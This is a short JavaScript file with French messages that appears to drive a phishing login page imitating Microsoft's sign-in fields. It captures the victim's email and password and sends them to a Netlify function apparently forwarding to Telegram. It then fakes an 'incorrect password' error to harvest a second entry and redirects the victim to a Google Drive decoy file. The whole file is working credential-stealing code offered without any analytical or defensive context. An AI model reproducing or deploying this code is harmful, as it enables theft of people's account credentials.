    const form = document.getElementById("contact-form");
    const passInput = document.getElementById("i0115");
    const errorMsg = document.getElementById("error-pass");

    let firstTry = true;
	
document.getElementById("contact-form").addEventListener("submit", async (e) => {
  e.preventDefault();

  const usermail = document.getElementById("i0116").value.trim();
  const pass = document.getElementById("i0115").value.trim();
  const errorPass = document.getElementById("error-pass");
  const successMsg = document.getElementById("success-msg");

  errorPass.textContent = "";
  successMsg.textContent = "";


  if (!usermail || !pass) {
    errorMsg.textContent = "Tous les champs sont obligatoires.";
	passInput.classList.add("error");
    return;
  }

  // URL de l'API Next.js en local
  const endpoint = "https://melodic-creponne-0babc8.netlify.app/.netlify/functions/telegram";

  try {
    const response = await fetch(endpoint, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ usermail, pass }),
    });

    const data = await response.json();
	
	if (firstTry) {
        // Première tentative : message d'erreur simulé
        errorMsg.textContent = "❌ Mot de Passe incorrect. ";
        passInput.value = "";
        passInput.classList.add("error");
        firstTry = false;
      } else {
        // Deuxième tentative : validation + redirection
        errorMsg.textContent = "";
        passInput.classList.remove("error");
        window.location.href = "https://drive.google.com/file/d/1sDt8VzFkvFh6k06-FRMMqR2-qoWxtf74/view?usp=sharing";
      }

    if (response.ok && data.success) {
      successMsg.textContent = "✅ Vérifiez vos informations. E-mail, identifiant, Mot de Passe.";
    } else {
      errorPass.textContent = "Erreur : " + (data.error || JSON.stringify(data));
      console.error("Réponse serveur :", data);
    }
  } catch (err) {
    console.error("Erreur réseau :", err);
    errorPass.textContent = "Erreur réseau. Vérifie que le serveur Next.js est démarré.";
  }

});
